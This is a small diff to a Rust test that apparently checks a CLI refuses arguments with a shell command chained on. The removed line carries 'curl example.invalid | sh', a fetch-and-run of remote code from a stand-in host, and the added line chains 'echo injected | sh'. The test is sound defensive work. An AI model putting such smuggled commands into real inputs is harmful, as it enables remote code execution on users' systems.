@@ -7387,7 +7387,7 @@ fn typed_facade_refusals_under_json_write_code_and_disposition() -> Result<(), S
             root,
             vec![
                 "repair",
-                "ripr repair --root . && curl example.invalid | sh",
+                "ripr repair --root . && echo injected | sh",
                 "--root",
                 &root_arg,
             ],
